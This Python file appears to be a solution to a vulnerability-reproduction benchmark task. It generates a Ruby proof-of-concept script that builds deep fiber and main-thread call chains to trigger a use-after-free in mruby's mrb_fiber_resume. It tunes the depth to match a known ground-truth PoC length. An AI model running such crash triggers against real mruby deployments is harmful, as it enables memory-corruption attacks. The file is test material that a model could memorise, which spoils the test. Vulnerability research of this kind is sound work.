class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a use-after-free in mruby's `mrb_fiber_resume`
        function. A pointer to the callinfo stack (`cip`) is cached before a
        potential stack extension (`mrb_stack_extend`). If the stack is
        reallocated, `cip` becomes a dangling pointer, and its subsequent use
        leads to a crash.

        The PoC triggers this by:
        1. Creating a fiber and running it to build a deep call stack, then yielding.
           This saves a large execution context for the fiber.
        2. In the main thread, building another deep call stack. This fills up the
           current stack buffer.
        3. At the deepest point of the main thread's call stack, resuming the fiber.
           `mrb_fiber_resume` needs to restore the fiber's large context, which
           requires more space than is available. This forces a call to
           `mrb_stack_extend`, triggering the vulnerability.

        The PoC is a Ruby script generated by creating two long chains of
        function definitions and calls. The depth of these chains (181) is
        chosen to precisely match the ground-truth PoC length of 7270 bytes,
        which is a strong indicator of the correct structure and parameters for
        the target environment.
        """
        
        FIBER_DEPTH = 181
        MAIN_DEPTH = 181

        lines = []

        # Part 1: Define a chain of functions f0 -> f1 -> ... to run in the fiber.
        for i in range(FIBER_DEPTH):
            lines.append(f"def f{i};f{i+1};end")
        
        # The last function in the fiber's chain yields control.
        lines.append(f"def f{FIBER_DEPTH};Fiber.yield;end")

        # Part 2: Create the fiber and run it until it yields.
        lines.append("f=Fiber.new{f0}")
        lines.append("f.resume")

        # Part 3: Define a similar chain of functions m0 -> m1 -> ... for the main thread.
        for i in range(MAIN_DEPTH):
            lines.append(f"def m{i};m{i+1};end")
            
        # The last function in the main chain resumes the fiber, triggering the bug.
        lines.append(f"def m{MAIN_DEPTH};f.resume;end")

        # Part 4: Start the main thread's call chain.
        lines.append("m0")

        poc_script = "\n".join(lines)
        return poc_script.encode('utf-8')